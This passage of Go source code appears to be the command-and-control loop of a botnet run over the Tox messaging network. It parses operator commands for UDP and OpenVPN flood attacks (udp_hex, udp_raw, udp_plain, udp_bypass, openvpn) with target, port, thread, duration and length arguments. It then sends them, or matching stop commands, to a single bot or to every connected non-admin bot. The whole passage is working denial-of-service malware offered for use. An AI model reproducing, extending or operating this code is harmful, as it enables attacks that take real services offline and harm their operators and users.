							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stop_raknet")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop RakNet command sent to %d bots", count))
				}
			} else if cmd == "openvpn" {
				if len(messages) < 5 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				if len(messages) >= 6 {
					botID, _ := strconv.ParseUint(messages[5], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("openvpn %s %s %s %s", target, port, threads, duration))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] OpenVPN attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("openvpn %s %s %s %s", target, port, threads, duration))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] OpenVPN attack command sent to %d bots", count))
				}
			} else if cmd == "stop_openvpn" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stop_openvpn")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop OpenVPN command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stop_openvpn")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop OpenVPN command sent to %d bots", count))
				}
			} else if cmd == "udp_hex" {
				if len(messages) < 6 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				length := messages[5]
				if len(messages) >= 7 {
					botID, _ := strconv.ParseUint(messages[6], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("udp_hex %s %s %s %s %s", target, port, threads, duration, length))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] UDP Hex attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("udp_hex %s %s %s %s %s", target, port, threads, duration, length))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] UDP Hex attack command sent to %d bots", count))
				}
			} else if cmd == "stop_udp_hex" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stop_udp_hex")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop UDP Hex command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stop_udp_hex")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop UDP Hex command sent to %d bots", count))
				}
			} else if cmd == "udp_raw" {
				if len(messages) < 6 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				length := messages[5]
				if len(messages) >= 7 {
					botID, _ := strconv.ParseUint(messages[6], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("udp_raw %s %s %s %s %s", target, port, threads, duration, length))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] UDP Raw attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("udp_raw %s %s %s %s %s", target, port, threads, duration, length))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] UDP Raw attack command sent to %d bots", count))
				}
			} else if cmd == "stop_udp_raw" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stop_udp_raw")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop UDP Raw command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stop_udp_raw")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop UDP Raw command sent to %d bots", count))
				}
			} else if cmd == "udp_plain" {
				if len(messages) < 6 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				length := messages[5]
				if len(messages) >= 7 {
					botID, _ := strconv.ParseUint(messages[6], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("udp_plain %s %s %s %s %s", target, port, threads, duration, length))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] UDP Plain attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("udp_plain %s %s %s %s %s", target, port, threads, duration, length))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] UDP Plain attack command sent to %d bots", count))
				}
			} else if cmd == "stop_udp_plain" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stop_udp_plain")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop UDP Plain command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stop_udp_plain")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop UDP Plain command sent to %d bots", count))
				}
			} else if cmd == "udp_bypass" {
				if len(messages) < 6 {
					net.AdminHelp(senderNum)
					return
				}
				target := messages[1]
				port := messages[2]
				threads := messages[3]
				duration := messages[4]
				length := messages[5]
				if len(messages) >= 7 {
					botID, _ := strconv.ParseUint(messages[6], 10, 32)
					t.FriendSendMessage(uint32(botID), fmt.Sprintf("udp_bypass %s %s %s %s %s", target, port, threads, duration, length))
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] UDP Bypass attack sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, fmt.Sprintf("udp_bypass %s %s %s %s %s", target, port, threads, duration, length))
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] UDP Bypass attack command sent to %d bots", count))
				}
			} else if cmd == "stop_udp_bypass" {
				if len(messages) >= 2 {
					botID, _ := strconv.ParseUint(messages[1], 10, 32)
					t.FriendSendMessage(uint32(botID), "stop_udp_bypass")
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop UDP Bypass command sent to bot %d", botID))
				} else {
					friends := t.SelfGetFriendList()
					count := 0
					for _, fno := range friends {
						isAdminBot := false
						friendKey, _ := t.FriendGetPublicKey(fno)
						for _, admin := range net.Admins {
							if len(admin) >= 64 && friendKey == admin[0:64] {
								isAdminBot = true
								break
							}
						}
						if !isAdminBot {
							status, _ := t.FriendGetConnectionStatus(fno)
							if status != 0 {
								t.FriendSendMessage(fno, "stop_udp_bypass")
								count++
							}
						}
					}
					t.FriendSendMessage(senderNum, fmt.Sprintf("[+] Stop UDP Bypass command sent to %d bots", count))
				}
			}
		} else {
			net.BotResponse(messages)
		}
	}, nil)

	// toxcore loops
	shutdown := false
	for !shutdown {
		t.Iterate()
		time.Sleep(1000 * 50 * time.Microsecond)
	}
	t.Kill()
}